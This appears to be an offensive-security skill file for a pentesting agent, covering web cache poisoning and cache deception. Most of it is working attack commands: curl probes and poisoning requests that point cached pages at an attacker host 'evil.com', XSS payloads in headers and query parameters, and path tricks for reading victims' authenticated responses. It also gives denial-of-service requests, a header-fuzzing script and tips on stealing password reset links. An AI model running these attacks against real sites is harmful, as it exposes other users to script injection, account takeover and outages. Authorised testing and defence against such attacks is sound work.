---
name: web-cache-poisoning
description: Web cache poisoning and cache deception attacks covering unkeyed headers, fat GET, parameter cloaking, CPDoS, and path normalization
---

# Web Cache Poisoning & Cache Deception

Cache attacks work by making the cache store and serve a malicious response to other users, or by tricking the cache into serving another user's private data to the attacker. Impact: stored XSS across the entire application, account takeover, DoS.

---

## Core Concepts

Cache Key = combination of request parameters the cache uses to identify a unique response.
Attack: inject something INTO the response via an unkeyed input → cache serves that poisoned response to everyone.

Two attack families:
- Cache Poisoning: poison the cache with your malicious input → victim receives it
- Cache Deception: trick the cache into storing a victim's private response → attacker reads it

---

## Reconnaissance

### Identify Caching Behavior

    # Look for cache indicators in response headers
    curl -sI https://target.com/ | grep -iE "cache|x-cache|cf-cache|age|cdn|varnish|surrogate"

    # Send same request twice — if Age: increases or X-Cache: HIT, it's cached
    curl -sI https://target.com/ | grep -i "x-cache\|age\|cf-cache"

    # Cache-busting: add unique param to get fresh response
    curl -sI "https://target.com/?cb=$(date +%s)"

### Discover Unkeyed Inputs

    # Automated: param-miner equivalent via web_search for "param miner burp extension"
    # Manual: test common unkeyed headers

    for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" \
                  "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-For" "X-Real-IP" \
                  "X-Original-Host" "Forwarded" "X-Forwarded-Proto"; do
        response=$(curl -sI "https://target.com/?cb=$(date +%s)" -H "$header: evil.com")
        if echo "$response" | grep -q "evil.com"; then
            echo "REFLECTED: $header"
        fi
    done

---

## Cache Poisoning Attacks

### X-Forwarded-Host Injection

Most common. Server uses this header to generate absolute URLs (password reset links, JS URLs):

    # Test reflection
    curl -s "https://target.com/?cb=1" -H "X-Forwarded-Host: evil.com" | grep "evil.com"

    # If reflected in script src or link href:
    # Poison: serve malicious JS from evil.com
    curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com"

    # Impact: all cached pages serve JS from evil.com → XSS for every visitor

### X-Forwarded-For / X-Real-IP Injection

Some apps render IP in response for analytics or debug:

    curl -s "https://target.com/" -H "X-Forwarded-For: \"><script>alert(1)</script>"

### Unkeyed Query Parameters

    # Find params excluded from cache key
    # Try: utm_*, _ga, fbclid, ref, source — often stripped from cache key but reflected in response

    curl -s "https://target.com/?utm_content=<script>alert(1)</script>" | grep "script"

    # If reflected, poison with unique CB param that's keyed:
    curl -s "https://target.com/?utm_content=<script>alert(1)</script>&normalcb=unique"

### Fat GET Request

Some caches key on URL only but backend parses body of GET request:

    curl -s -X GET "https://target.com/" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "param=<script>alert(1)</script>"

### Cache Key Injection (Header Splitting)

    # Inject cache key separator to create a new cache entry
    curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com\r\nX-Cache-Key: injected"

### Parameter Cloaking

Discrepancy between how the CDN and origin parse query strings:

    # CDN sees: ?search=clean&param=value
    # Origin (Node/Ruby/PHP) sees last duplicate: ?param=evil
    curl -s "https://target.com/?search=clean;param=evil" | grep "evil"
    curl -s "https://target.com/?search=clean%26param=evil" | grep "evil"

---

## Cache Deception

Trick the cache into storing the victim's authenticated response so the attacker can read it.

### Path Confusion

Cache caches based on file extension (.css, .js, .png) regardless of actual content:

    # Visit: /account/settings.css
    # Cache stores it thinking it's CSS
    # Attacker reads: /account/settings.css → gets victim's account page

    # Test: append static-looking suffix after authenticated path
    for suffix in ".css" ".js" ".png" ".ico" ".woff" "/null.js" "/index.css"; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/api/user$suffix" \
          -H "Authorization: Bearer <token>")
        cached=$(curl -sI "https://target.com/api/user$suffix" | grep -i "x-cache\|age" | head -1)
        echo "$suffix → HTTP $code | $cached"
    done

### Cache Rules Misalignment

    # If /static/* is cached but server serves JSON for /static/../api/user
    curl -s "https://target.com/static/../api/user" -H "Authorization: Bearer <victim_token>"
    # Then attacker reads cached response without token

### Normalized Path Confusion

    # Server normalizes: /account/..%2Fstatic%2Fstyle.css → /static/style.css
    # Cache caches based on raw URL → stores as /account/..%2Fstatic%2Fstyle.css
    # Victim's authenticated version gets cached under that key

---

## CPDoS (Cache Poisoned Denial of Service)

Poison cache with error responses to deny service to all users:

    # HHO — HTTP Header Oversize
    # Send request with very long header → 400 error cached by CDN
    curl -s "https://target.com/" -H "X-Crash: $(python3 -c "print('A'*8192)")"

    # HMC — HTTP Meta Characters
    curl -s "https://target.com/" -H $'X-Meta: test\r\nContent-Length: 0'

    # SCP — Site Cache Poisoning via method
    curl -s -X DELETE "https://target.com/" | head -5
    # If 405 is cached → DoS

---

## Detecting Cache Scope

    # Determine what varies the cache key
    # Same URL, different Accept-Language → different response? → Language in key
    curl -sI "https://target.com/?cb=test1" -H "Accept-Language: fr"
    curl -sI "https://target.com/?cb=test1" -H "Accept-Language: en"

    # Cookie in key?
    curl -sI "https://target.com/" -H "Cookie: session=abc123"

    # User-Agent in key?
    curl -sI "https://target.com/" -H "User-Agent: Mozilla/5.0"
    curl -sI "https://target.com/" -H "User-Agent: Googlebot"

---

## Automation

    # nuclei cache poisoning templates
    nuclei -u https://target.com -t /home/pentester/nuclei-templates/vulnerabilities/other/ \
      -tags cache -o output/cache_nuclei.txt

    # toxicache — dedicated cache poisoning tool
    toxicache -u https://target.com

    # Custom header fuzzer for unkeyed inputs
    python3 tools/cache_header_fuzz.py https://target.com

Example script (`tools/cache_header_fuzz.py`):

    #!/usr/bin/env python3
    import requests, sys
    TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    HEADERS_TO_TEST = [
        "X-Forwarded-Host", "X-Host", "X-Forwarded-Server",
        "X-Original-URL", "X-Rewrite-URL", "Forwarded",
        "X-Forwarded-For", "X-Real-IP", "X-Custom-IP-Authorization",
        "X-Original-Host", "X-HTTP-Host-Override", "X-Forwarded-Proto",
    ]
    CANARY = "evil.example.com"
    results = []
    for h in HEADERS_TO_TEST:
        import time; cb = str(int(time.time()*1000))
        r = requests.get(f"{TARGET}?cb={cb}", headers={h: CANARY}, timeout=10)
        reflected = CANARY in r.text
        results.append(f"{'REFLECTED' if reflected else 'not reflected'} | {h}")
        print(results[-1])
    with open("output/cache_fuzz.txt","w") as f:
        f.write("\n".join(results))

---

## Validation

1. Confirm cache stores your poisoned response: make poisoning request, then fetch WITHOUT the injection header — does the canary appear?
2. Test from a different IP/session to confirm it's served to other users
3. For Cache Deception: log in as victim, visit deception URL, log out, access same URL unauthenticated — does victim data appear?
4. Demonstrate impact: XSS execution, credential/token exposure, or service disruption

---

## Pro Tips

1. Always use a cache-buster param when testing to avoid poisoning production by accident
2. X-Forwarded-Host is reflected in ~30% of CDN-backed apps — test it first
3. Unkeyed parameters: UTM params (utm_source, utm_campaign) are almost universally unkeyed
4. Check password reset flows — if reset URL uses X-Forwarded-Host, cache poison → steal reset links
5. Cache deception on `/profile.css` is an instant account takeover if session data is returned
6. CPDoS with HHO (oversized header) is the easiest to test and often overlooked by defenders
7. After finding an unkeyed header, check what it controls: JS URLs, redirect targets, or meta refresh → highest impact

## Summary

Cache poisoning = find unkeyed input → confirm it's reflected → make cacheable → observe cache serving it to others. Cache deception = append static extension to private endpoint → visit as victim → read from cache as attacker. Both require proof via second-user fetch to confirm real impact.
